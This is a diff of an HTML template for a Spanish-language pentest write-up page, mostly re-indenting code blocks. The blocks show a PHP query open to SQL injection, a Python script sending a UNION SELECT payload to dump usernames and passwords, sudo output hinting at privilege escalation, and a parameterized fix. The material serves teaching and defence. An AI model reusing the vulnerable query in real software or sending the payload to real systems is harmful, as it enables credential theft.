@@ -91,7 +91,7 @@
                 22/tcp  open  ssh      OpenSSH 8.2p1
                 80/tcp  open  http     Apache httpd 2.4.46
                 443/tcp open  https    Apache httpd 2.4.46
-</code></pre>
+                </code></pre>
 
                 <h3>Enumeración Web</h3>
                 <p>Información recopilada durante la fase de reconocimiento web.</p>
@@ -116,10 +116,10 @@
                     Aquí puedes incluir ejemplos de código vulnerable, salidas de herramientas de análisis, o explicaciones paso a paso de cómo descubriste la vulnerabilidad.
                 </p>
                 <pre><code class="language-php">// Ejemplo de código vulnerable
-$id = $_GET['id'];
-$query = "SELECT * FROM products WHERE product_id = $id"; // Vulnerable a SQLi
-$result = mysqli_query($conn, $query);
-</code></pre>
+                $id = $_GET['id'];
+                $query = "SELECT * FROM products WHERE product_id = $id"; // Vulnerable a SQLi
+                $result = mysqli_query($conn, $query);
+                </code></pre>
             </section>
 
             <section id="explotacion">
@@ -132,14 +132,14 @@ $result = mysqli_query($conn, $query);
                     Explica cómo desarrollaste o utilizaste un exploit para aprovechar la vulnerabilidad.
                 </p>
                 <pre><code class="language-python"># Ejemplo de script de explotación
-import requests
+                import requests
 
-url = "http://target.com/vulnerable.php"
-payload = "1' UNION SELECT username,password FROM users -- -"
+                url = "http://target.com/vulnerable.php"
+                payload = "1' UNION SELECT username,password FROM users -- -"
 
-response = requests.get(f"{url}?id={payload}")
-print(response.text)
-</code></pre>
+                response = requests.get(f"{url}?id={payload}")
+                print(response.text)
+                </code></pre>
 
                 <h3>Ejecución del Ataque</h3>
                 <p>
@@ -161,14 +161,14 @@ print(response.text)
                     Explica cómo escalaste privilegios en el sistema, si fue aplicable.
                 </p>
                 <pre><code class="language-bash">$ sudo -l
-User www-data may run the following commands on target:
-    (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
+                User www-data may run the following commands on target:
+                    (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
 
-$ cat /opt/backup.py
-import os
-import zipfile
-# El resto del script...
-</code></pre>
+                $ cat /opt/backup.py
+                import os
+                import zipfile
+                # El resto del script...
+                </code></pre>
             </section>
 
             <section id="mitigacion">
@@ -189,12 +189,12 @@ import zipfile
                     Código corregido como ejemplo:
                 </p>
                 <pre><code class="language-php">// Código corregido
-$id = $_GET['id'];
-$stmt = $conn->prepare("SELECT * FROM products WHERE product_id = ?");
-$stmt->bind_param("i", $id); // Consulta parametrizada segura
-$stmt->execute();
-$result = $stmt->get_result();
-</code></pre>
+                $id = $_GET['id'];
+                $stmt = $conn->prepare("SELECT * FROM products WHERE product_id = ?");
+                $stmt->bind_param("i", $id); // Consulta parametrizada segura
+                $stmt->execute();
+                $result = $stmt->get_result();
+                </code></pre>
             </section>
 
             <section id="conclusion">
@@ -232,7 +232,7 @@ $result = $stmt->get_result();
                 <img src="../assets/images/profile.jpg" alt="Foto de perfil">
                 <h3>Tu Nombre</h3>
                 <p>Profesional en Ciberseguridad especializado en pentesting y análisis de vulnerabilidades.</p>
-                <div class="author-social">
+                <div class="social-links">
                     <a href="#"><i class="fab fa-github"></i></a>
                     <a href="#"><i class="fab fa-linkedin"></i></a>
                     <a href="#"><i class="fab fa-twitter"></i></a>
